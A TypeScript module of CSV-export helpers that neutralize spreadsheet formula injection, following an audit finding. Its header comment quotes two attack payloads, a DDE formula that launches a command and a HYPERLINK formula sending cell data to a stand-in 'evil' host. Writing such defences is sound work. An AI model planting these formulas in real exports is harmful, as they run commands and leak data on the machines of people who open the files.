// Sprint 19: CSV injection prevention + sanitization utilities
//
// #S04-05 (ARCTOS-FULL-2026-08-31, Medium) — CSV formula injection.
//
// This module already existed and was used correctly by `import-executor`,
// `export-engine` and `translations/export`. Six ad-hoc export routes
// hand-rolled their own escaper instead and only handled RFC-4180 quoting,
// so a risk title / SoA justification / activity name / RACI participant
// name starting with `=`, `+`, `-` or `@` was written verbatim:
//
//   =cmd|'/C calc'!A1
//   =HYPERLINK("http://evil/?"&A1,"exfiltrated")
//
// and evaluated as a formula when an auditor opened the export.
//
// `toCsvCell` below is now the single entry point for producing a CSV cell:
// neutralize first, then quote for the given delimiter. `escapeCsvField`
// also neutralizes now, so any remaining caller of the old two-step idiom
// is safe by construction — the double application is a no-op because a
// value already prefixed with `'` no longer starts with a dangerous
// character.

/** Characters that make Excel/LibreOffice/Numbers treat a cell as a formula. */
const FORMULA_TRIGGER = /^([=+\-@\t\r])/;

/**
 * Sanitize a string value to prevent CSV injection.
 * Prefixes a leading =, +, -, @, \t or \r with a single quote so the cell
 * is imported as literal text.
 */
export function sanitizeCsvValue(value: string): string {
  if (typeof value !== "string") return String(value ?? "");
  return value.replace(FORMULA_TRIGGER, "'$1");
}

/**
 * Sanitize all string values in an object for CSV injection prevention.
 */
export function sanitizeRowValues(
  row: Record<string, unknown>,
): Record<string, unknown> {
  const sanitized: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(row)) {
    if (typeof value === "string") {
      sanitized[key] = sanitizeCsvValue(value);
    } else {
      sanitized[key] = value;
    }
  }
  return sanitized;
}

/**
 * Render one CSV cell: neutralize formula triggers, then quote/escape for
 * the given delimiter.
 *
 * This is THE helper every CSV export must use. `delimiter` exists because
 * the German-Excel-friendly exports (SoA, audit checklists) use `;`.
 * Arrays are joined with "; " to match the existing ROPA/vendor exports.
 */
export function toCsvCell(value: unknown, delimiter = ","): string {
  if (value === null || value === undefined) return "";
  const raw = Array.isArray(value)
    ? value.map((v) => String(v ?? "")).join("; ")
    : typeof value === "object"
      ? JSON.stringify(value)
      : String(value);

  const safe = sanitizeCsvValue(raw);

  if (
    safe.includes(delimiter) ||
    safe.includes('"') ||
    safe.includes("\n") ||
    safe.includes("\r")
  ) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

/**
 * Build one CSV line from an array of raw values.
 */
export function toCsvRow(values: unknown[], delimiter = ","): string {
  return values.map((v) => toCsvCell(v, delimiter)).join(delimiter);
}

/**
 * Escape a field for CSV output (wrap in quotes if it contains commas,
 * quotes, or newlines).
 *
 * #S04-05: now ALSO neutralizes formula triggers, so a caller that only
 * escapes (the historical mistake) is still safe.
 */
export function escapeCsvField(field: unknown): string {
  return toCsvCell(field, ",");
}

/**
 * Convert an array of objects to CSV string with headers.
 */
export function objectsToCsv(
  data: Record<string, unknown>[],
  columns: { key: string; header: string }[],
): string {
  const headerRow = columns.map((c) => toCsvCell(c.header)).join(",");
  const dataRows = data.map((row) =>
    columns.map((c) => toCsvCell(row[c.key])).join(","),
  );
  return [headerRow, ...dataRows].join("\n");
}
